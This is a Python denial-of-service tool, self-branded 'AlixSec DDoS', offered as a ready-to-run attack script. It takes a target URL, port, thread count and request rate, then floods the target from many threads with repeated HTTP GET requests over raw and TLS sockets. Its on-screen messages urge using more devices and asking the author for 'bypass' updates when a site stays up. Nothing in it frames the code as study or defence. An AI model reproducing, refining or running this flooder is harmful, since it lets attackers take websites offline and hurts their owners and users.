import socket
import threading
import argparse
import random
import os
import time
import requests
import cloudscraper
from colorama import Fore
from urllib.parse import urlparse
from random import choice as che
from random import randint as ran
from random import _urandom as byt
from certifi import where
from ssl import CERT_NONE, SSLContext, create_default_context
from threading import Thread as thr
from colorama import init as colorama_init
from http.client import HTTPResponse as httpr
from requests import get
colorama_init(autoreset=True)

app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']

os.system('cls' if os.name == 'nt' else 'clear')

banner = Fore.LIGHTRED_EX+"""



 █████╗ ██╗     ██╗██╗  ██╗███████╗███████╗ ██████╗    ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██║     ██║╚██╗██╔╝██╔════╝██╔════╝██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
███████║██║     ██║ ╚███╔╝ ███████╗█████╗  ██║         ██║  ██║██║  ██║██║   ██║███████╗
██╔══██║██║     ██║ ██╔██╗ ╚════██║██╔══╝  ██║         ██║  ██║██║  ██║██║   ██║╚════██║
██║  ██║███████╗██║██╔╝ ██╗███████║███████╗╚██████╗    ██████╔╝██████╔╝╚██████╔╝███████║
╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                                                                        
                                                   
                                                   
                                                   
  _          _                      __                            _    _ _                    
 | |    ___ | |__   ___  ___       / _|_ __ ___  _ __ ___        / \  | (_)_  _____  ___  ___ 
 | |   / _ \| '_ \ / _ \/ _ \     | |_| '__/ _ \| '_ ` _ \      / _ \ | | \ \/ / __|/ _ \/ __|
 | |__| (_) | |_) |  __/  __/     |  _| | | (_) | | | | | |    / ___ \| | |>  <\__ \  __/ (__ 
 |_____\___/|_.__/ \___|\___|     |_| |_|  \___/|_| |_| |_|   /_/   \_\_|_/_/\_\___/\___|\___| 
                                                                                         
                                                                                      

                                                                                                        

                                                                        """

print(banner)

parser = argparse.ArgumentParser()
parser.add_argument('m',help="METHOD")
parser.add_argument('u', help="ENTER TARGET WITH HTTP , HTTPS")
parser.add_argument('p', help="ENTER PORT [HTTP = 80 HTTPS = 443]", type=int)
parser.add_argument('t', help="THREADS | MAX = UNLIMITED", type=int)
parser.add_argument('r', help="RPC | MAX = UNLIMITED", type=int)
parser.add_argument('-method',help="METHODS || kill , kill+ ")
parser.add_argument('-example',help="example : python alixsec-DDoS.py kill http://example.com 80 1000 1000")
args = parser.parse_args()

method = args.m
url = args.u
port = args.p
threads = args.t
rpc = args.r

parsed_url = urlparse(url)
target = parsed_url.netloc
ip = socket.gethostbyname(target)

os.system('CLS')

print(Fore.GREEN + '''
   ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
   ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
   ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
''')

print(Fore.LIGHTYELLOW_EX + f"""
TARGET = {url} 
PORT = {port}
METHOD = {method} 
THREAD = {threads} 
RPC = {rpc}""")
time.sleep(1.5)
print(Fore.LIGHTCYAN_EX + "For Best Results , U can Use more Devices")
time.sleep(0.5)
print(Fore.LIGHTRED_EX + "If site is still working , it needs to be bypassed. Ask ALIXSEC for update if not working")
time.sleep(2.5)
print(Fore.LIGHTRED_EX+"["+Fore.LIGHTYELLOW_EX+"$"+Fore.LIGHTRED_EX+"]", Fore.LIGHTRED_EX + "Attack", Fore.LIGHTCYAN_EX + "Started", Fore.LIGHTYELLOW_EX + "!" + Fore.LIGHTRED_EX + "!" + Fore.LIGHTRED_EX + "!")

ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0"
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7"
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
]

ssl = create_default_context(cafile=where())
ssl.check_hostname = False
ssl.verify_mode = CERT_NONE

def spo_ip():
	addr = [192, 168, 0, 1]; d = '.'; addr[0] = str(ran(11, 197)); addr[1] = str(ran(0, 255)); addr[2] = str(ran(0, 255)); addr[3] = str(ran(2, 254)); ass = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]; return ass


def generate_payload1():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferre: {che(reff)}\r\n\r\n'.encode(encoding='utf-8')

def generate_payload2():
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\nsec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: "Windows"\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\n\r\n'.encode(encoding='utf-8')

def kill():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload1()
                s.send(payl)
        except:
            pass

def killplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload2()
                s.send(payl)
        except:
            pass


if method == "kill":
    for _ in range(threads):
        t = threading.Thread(target=kill)
        t.start()
elif method == "kill+":
    for _ in range(threads):
        t = threading.Thread(target=killplus)
        t.start()












#TOOLMADE_BY Alixsec
